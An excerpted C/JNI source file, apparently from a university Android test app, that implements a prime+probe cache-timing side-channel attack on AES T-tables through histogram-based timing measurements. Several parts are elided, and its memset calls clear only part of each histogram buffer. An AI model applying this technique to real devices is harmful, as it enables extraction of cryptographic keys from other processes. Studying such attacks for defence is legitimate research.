...
int getAllTablePPTime(libcache_session_t *libcache_session, unsigned char *inaes, aesSample **sample, aesSample **sample_tmp, aesTableStartSet* tabless, int index, uint64_t *histogram_pp, uint64_t *histogram_pp2, uint64_t *histogram_pp3, uint64_t *histogram_pp4);
...
Java_www_buaa_edu_cn_testlibcache_TestLibCache_callNativeLibCacheAttack(JNIEnv* env, jobject obj, jint jcpu)
{
	...
	aesSample* sample_tmp[AES_SAMPLE_SUM];
...
#else
	uint64_t *histogram_pp;
	histogram_pp = (uint64_t*)malloc(PP_MAX_TIME / HISTOGRAM_SCALE * sizeof(uint64_t));
	if (histogram_pp == NULL) {
		LOGI("ERROR : could not allocate memory to histogram_pp!!");
		return -1;
	}
	memset(histogram_pp, 0, PP_MAX_TIME / HISTOGRAM_SCALE);
	uint64_t *histogram_pp2;
	histogram_pp2 = (uint64_t*)malloc(PP_MAX_TIME / HISTOGRAM_SCALE * sizeof(uint64_t));
	if (histogram_pp2 == NULL) {
		LOGI("ERROR : could not allocate memory to histogram_pp2!!");
		freeresource(histogram_pp, NULL, NULL, NULL);
		return -1;
	}
	memset(histogram_pp2, 0, PP_MAX_TIME / HISTOGRAM_SCALE);
	uint64_t *histogram_pp3;
	histogram_pp3 = (uint64_t*)malloc(PP_MAX_TIME / HISTOGRAM_SCALE * sizeof(uint64_t));
	if (histogram_pp3 == NULL) {
		LOGI("ERROR : could not allocate memory to histogram_pp3!!");
		freeresource(histogram_pp, histogram_pp2, NULL, NULL);
		return -1;
	}
	memset(histogram_pp3, 0, PP_MAX_TIME / HISTOGRAM_SCALE);
	uint64_t *histogram_pp4;
	histogram_pp4 = (uint64_t*)malloc(PP_MAX_TIME / HISTOGRAM_SCALE * sizeof(uint64_t));
	if (histogram_pp4 == NULL) {
		LOGI("ERROR : could not allocate memory to histogram_pp4!!");
		freeresource(histogram_pp, histogram_pp2, histogram_pp3, NULL);
		return -1;
	}
	memset(histogram_pp4, 0, PP_MAX_TIME / HISTOGRAM_SCALE);
#endif
	...
	for (int i = 0; i < AES_SAMPLE_SUM; i++) {
		if (sample_tmp[i] == NULL) {
			sample_tmp[i] = (aesSample*)malloc(sizeof(aesSample));
			if (sample_tmp[i] == NULL) {
				LOGI("ERROR : could not allocate memory for sample_tmp[%d]!!!", i);
				return -1;
			}
		} else {
			LOGI("ERROR : sample_tmp is not null when initialization!");
		}
	}
	for (int i = 0; i < AES_SAMPLE_SUM; i++) {
...
*/
		...
		getAllTablePPTime(libcache_session, inaes, sample, sample_tmp, &tabless, i, histogram_pp, histogram_pp2, histogram_pp3, histogram_pp4);
		...
		for (int j3 = 0; j3 < AES_TABLE_LENGTH; j3++) {
			sample[i]->t3_time[j3] = getPPTime(libcache_session, inaes, tmp, histogram, tmp2, histogram2, tabless.t3_sd[j3]);
		}
		LOGI("%d", i);
#endif		
	}
	...
	freeSample(sample);
	freeSample(sample_tmp);
	freeresource(histogram_pp, histogram_pp2, histogram_pp3, histogram_pp4);
...
int getAllTablePPTime(libcache_session_t *libcache_session, unsigned char *inaes, aesSample **sample, aesSample **sample_tmp, aesTableStartSet* tabless, int index, uint64_t *histogram_pp, uint64_t *histogram_pp2, uint64_t *histogram_pp3, uint64_t *histogram_pp4) {
	aesSampleAverageTime noaesavgtime, hasaesavgtime;
	eraseSample(sample_tmp);
	...
	for (int i = 0; i < AES_SAMPLE_SUM; i++) {
		aesPrimeAllSet(libcache_session, tabless);
		aesProbeAllSet(libcache_session, sample_tmp, tabless, i);
	}
	for (int i = 0; i < AES_TABLE_LENGTH; i++) {
		for (int j = 0; j < AES_SAMPLE_SUM; j++) {
			histogram_pp[MINI(sample_tmp[j]->t0_time[i] / HISTOGRAM_SCALE, (PP_MAX_TIME - 1) / HISTOGRAM_SCALE)] += 1;
			histogram_pp2[MINI(sample_tmp[j]->t1_time[i] / HISTOGRAM_SCALE, (PP_MAX_TIME - 1) / HISTOGRAM_SCALE)] += 1;
			histogram_pp3[MINI(sample_tmp[j]->t2_time[i] / HISTOGRAM_SCALE, (PP_MAX_TIME - 1) / HISTOGRAM_SCALE)] += 1;
			histogram_pp4[MINI(sample_tmp[j]->t3_time[i] / HISTOGRAM_SCALE, (PP_MAX_TIME - 1) / HISTOGRAM_SCALE)] += 1;
		}
		int maxindex, maxindex2, maxindex3, maxindex4;
		maxindex = maxindex2 = maxindex3 = maxindex4 = 0;
		int maxvalue = histogram_pp[0];
		int maxvalue2 = histogram_pp2[0];
		int maxvalue3 = histogram_pp3[0];
		int maxvalue4 = histogram_pp4[0];
		for (int i = 0; i < PP_MAX_TIME / HISTOGRAM_SCALE; i++) {
			if (histogram_pp[i] > maxvalue) {
				maxindex = i;
				maxvalue = histogram_pp[i];
			}
			if (histogram_pp2[i] > maxvalue2) {
				maxindex2 = i;
				maxvalue2 = histogram_pp2[i];
			}
			if (histogram_pp3[i] > maxvalue3) {
				maxindex3 = i;
				maxvalue3 = histogram_pp3[i];
			}
			if (histogram_pp4[i] > maxvalue4) {
				maxindex4 = i;
				maxvalue4 = histogram_pp4[i];
			}
		}
		noaesavgtime.t0_avg_time[i] = maxindex;
		noaesavgtime.t1_avg_time[i] = maxindex2;
		noaesavgtime.t2_avg_time[i] = maxindex3;
		noaesavgtime.t3_avg_time[i] = maxindex4;
	}
	eraseSample(sample_tmp);
	for (int i = 0; i < PP_MAX_TIME / HISTOGRAM_SCALE; i++) {
		histogram_pp[i] = 0;
	...
	for (int i = 0; i < AES_TABLE_LENGTH; i++) {
		...
		hasaesavgtime.t0_avg_time[i] = maxindex;
		hasaesavgtime.t1_avg_time[i] = maxindex2;
		hasaesavgtime.t2_avg_time[i] = maxindex3;
		hasaesavgtime.t3_avg_time[i] = maxindex4;
	}
	for (int i = 0; i < AES_TABLE_LENGTH; i++) {
		sample[index]->t0_time[i] = MAXI(hasaesavgtime.t0_avg_time[i] - noaesavgtime.t0_avg_time[i], 0) * HISTOGRAM_SCALE;
		sample[index]->t1_time[i] = MAXI(hasaesavgtime.t1_avg_time[i] - noaesavgtime.t1_avg_time[i], 0) * HISTOGRAM_SCALE;
		sample[index]->t2_time[i] = MAXI(hasaesavgtime.t2_avg_time[i] - noaesavgtime.t2_avg_time[i], 0) * HISTOGRAM_SCALE;
		sample[index]->t3_time[i] = MAXI(hasaesavgtime.t3_avg_time[i] - noaesavgtime.t3_avg_time[i], 0) * HISTOGRAM_SCALE;
	}
	return 0;
}
